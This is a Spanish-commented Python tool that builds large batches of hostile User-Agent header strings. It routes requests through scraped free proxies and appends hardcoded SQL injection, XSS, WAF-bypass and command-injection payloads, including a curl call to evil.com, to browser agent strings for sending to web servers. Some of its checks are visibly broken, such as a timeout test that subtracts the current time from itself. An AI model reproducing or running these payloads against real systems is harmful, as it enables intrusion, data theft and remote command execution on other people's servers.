# DESC: Gen Usser-Agents. Uso: uss -c 10 txt all/xss/waf/rce/sqli
import sys
import os
import time
import random
import json
import csv
import gzip
import threading
import requests
import re
from datetime import datetime

def usage():
    print("Uso: python3 uss.py [-c <count>] [txt|json|csv] [gzip] [all|sqli|xss|waf|rce]")
    print("Ejemplo: python3 uss.py -c 1000 json gzip sqli")
    sys.exit(1)

if len(sys.argv) < 2:
    usage()

max_agents = 100000
max_file_size = 30 * 1024 * 1024
max_execution_time = 30

count = 10
output_format = 'txt'
use_gzip = False
payload_category = 'all'

args = sys.argv[1:]
if '-c' in args:
    count_index = args.index('-c') + 1
    if count_index >= len(args):
        print("Error: Debe especificar un número después de -c")
        sys.exit(1)
    try:
        count = int(args[count_index])
        if count < 1 or count > max_agents:
            print(f"Error: La cantidad debe estar entre 1 y {max_agents}")
            sys.exit(1)
    except ValueError:
        print("Error: La cantidad debe ser un número válido")
        sys.exit(1)

if 'txt' in args:
    output_format = 'txt'
elif 'json' in args:
    output_format = 'json'
elif 'csv' in args:
    output_format = 'csv'

use_gzip = 'gzip' in args
if payload_category in ['all', 'sqli', 'xss', 'waf', 'rce']:
    payload_category = args[args.index('all') if 'all' in args else
                           args.index('sqli') if 'sqli' in args else
                           args.index('xss') if 'xss' in args else
                           args.index('waf') if 'waf' in args else
                           args.index('rce') if 'rce' in args else 'all']

timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
output_dir = f"uss_{timestamp}"
os.makedirs(output_dir, exist_ok=True)

json_summary = os.path.join(output_dir, "uss_summary.json")
with open(json_summary, "w") as f:
    f.write("{")

def save_to_file(name, content):
    print(f"\n=== {name} ===")
    print(content)
    with open(os.path.join(output_dir, f"{name}.txt"), "w") as f:
        print(f"=== {name} ===", file=f)
        print(content, file=f)
        print("", file=f)

def add_to_json(key, value):
    with open(json_summary, "a") as f:
        f.write(f'  "{key}": {value},')

def get_proxies():
    try:
        response = requests.get("https://free-proxy-list.net/", timeout=10)
        proxies = []
        for line in response.text.split("\n"):
            match = re.search(r'data-ip="(\d+\.\d+\.\d+\.\d+)"\s+data-port="(\d+)"', line)
            if match:
                proxies.append(f"{match.group(1)}:{match.group(2)}")
        return proxies[:10]
    except:
        return []

proxies = get_proxies()
print(f"Proxies disponibles: {len(proxies)}")
save_to_file("proxies", "\n".join(proxies))
add_to_json("proxies", json.dumps(proxies))

def fetch_external_user_agents():
    try:
        proxy = random.choice(proxies) if proxies else None
        proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        response = requests.get("https://user-agents.net/random", headers={"User-Agent": random.choice(base_user_agents)}, proxies=proxies_dict, timeout=10)
        agents = re.findall(r'Mozilla/5.0.*?</a>', response.text)
        return [agent[:-4] for agent in agents][:100]
    except:
        return []

base_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.2088.46",
    "Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:102.0) Gecko/102.0 Firefox/102.0"
] + fetch_external_user_agents()

payloads = {
    "sqli": [
        "') OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- utPM",
        "' OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- GGPU",
        ")) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((2361=2361",
        "' OR 1=1--",
        "') UNION SELECT NULL,@@version,@@hostname--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "') OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database())--",
        "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--",
        "') AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
        "' OR 1=CONVERT(int,(SELECT @@version))--",
        "') UNION ALL SELECT NULL,version(),database()--"
    ],
    "xss": [
        "');alert('XSS')//",
        "');<script>alert('XSS')</script>;//",
        "');document.write('<img src=x onerror=alert(1)>');//",
        "');<svg onload=alert('XSS')>",
        "');prompt('XSS')//",
        "');eval('alert(1)')//",
        "');<iframe src=javascript:alert('XSS')>",
        "');document.location='javascript:alert(1)'//"
    ],
    "waf": [
        "'/**/OR/**/1=1--",
        "' OR '1'='1' #",
        "') OR (SELECT 1 FROM dual WHERE 1=1)--",
        "' OR 'a'='a' UNION SELECT NULL,@@version--",
        "'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--",
        "' OR 1=1/*comment*/--",
        "' UNION /*bypass*/ SELECT NULL,@@version--",
        "' OR '1'='1'--%0A"
    ],
    "rce": [
        "');exec('whoami')--",
        "');system('id')--",
        "');<?php system('whoami');?>//",
        "');eval('system(\"id\")')--",
        "');`whoami`--",
        "');$(whoami)//",
        "');exec('curl http://evil.com')--",
        "');passthru('id')--"
    ]
}

def generate_malicious_user_agents(count, category):
    selected_payloads = payloads[category] if category != "all" else [p for cat in payloads.values() for p in cat]
    user_agents = set()
    start_time = time.time()
    while len(user_agents) < count and time.time() - start_time < max_execution_time:
        base_agent = random.choice(base_user_agents)
        payload = random.choice(selected_payloads)
        user_agent = f"{base_agent}{payload}"
        if len(user_agent.encode()) <= 1024:
            user_agents.add(user_agent)
    return list(user_agents)[:count]

print(f"Generando {count} User-Agents en formato {output_format}{' con compresión gzip' if use_gzip else ''}...")
add_to_json("count", count)
add_to_json("output_format", json.dumps(output_format))
add_to_json("use_gzip", json.dumps(use_gzip))
add_to_json("payload_category", json.dumps(payload_category))
add_to_json("start_time", json.dumps(datetime.now().isoformat()))

user_agents = []
lock = threading.Lock()

def generate_chunk(chunk_size, category):
    chunk = generate_malicious_user_agents(chunk_size, category)
    with lock:
        user_agents.extend(chunk)

threads = []
chunk_size = count // 4 + 1
for _ in range(4):
    t = threading.Thread(target=generate_chunk, args=(chunk_size, payload_category))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

user_agents = user_agents[:count]
if not user_agents:
    print("Error: No se pudieron generar User-Agents.")
    sys.exit(1)

if time.time() - time.time() > max_execution_time:
    print(f"Error: Tiempo de generación excedido ({max_execution_time} segundos).")
    sys.exit(1)

file_name = f"ua.{output_format}{'.gz' if use_gzip else ''}"
file_path = os.path.join(output_dir, file_name)
file_size = 0

if output_format == 'json':
    json_data = json.dumps(user_agents, indent=2)
    line = f"{json_data}\n"
    line_size = len(line.encode())
    if line_size > max_file_size:
        print(f"Error: El archivo JSON excede el límite de 30 MB.")
        sys.exit(1)
    if use_gzip:
        with gzip.open(file_path, 'wt') as f:
            f.write(line)
    else:
        with open(file_path, 'w') as f:
            f.write(line)
elif output_format == 'csv':
    with (gzip.open(file_path, 'wt') if use_gzip else open(file_path, 'w')) as f:
        writer = csv.writer(f)
        writer.writerow(["User-Agent"])
        for ua in user_agents:
            line = [ua]
            line_size = len(','.join(line).encode())
            if file_size + line_size > max_file_size:
                print(f"Límite de 30 MB alcanzado. Guardados {user_agents.index(ua)} User-Agents en {file_path}")
                break
            writer.writerow(line)
            file_size += line_size
else:
    with (gzip.open(file_path, 'wt') if use_gzip else open(file_path, 'w')) as f:
        for ua in user_agents:
            line = f"{ua}\n"
            line_size = len(line.encode())
            if file_size + line_size > max_file_size:
                print(f"Límite de 30 MB alcanzado. Guardados {user_agents.index(ua)} User-Agents en {file_path}")
                break
            f.write(line)
            file_size += line_size

print(f"Completado: {len(user_agents)} User-Agents generados en {file_name}.")
save_to_file("summary", f"Generados: {len(user_agents)} User-Agents\nFormato: {output_format}\nCompresión: {'gzip' if use_gzip else 'ninguna'}\nCategoría: {payload_category}\nGuardado en: {file_path}")

with open(json_summary, "a") as f:
    f.seek(0, 2)
    f.seek(f.tell() - 1, 0)
    f.truncate()
    f.write(f', "end_time": "{datetime.now().isoformat()}", "generated_count": {len(user_agents)}')

print(f"Resultados guardados en {output_dir}/")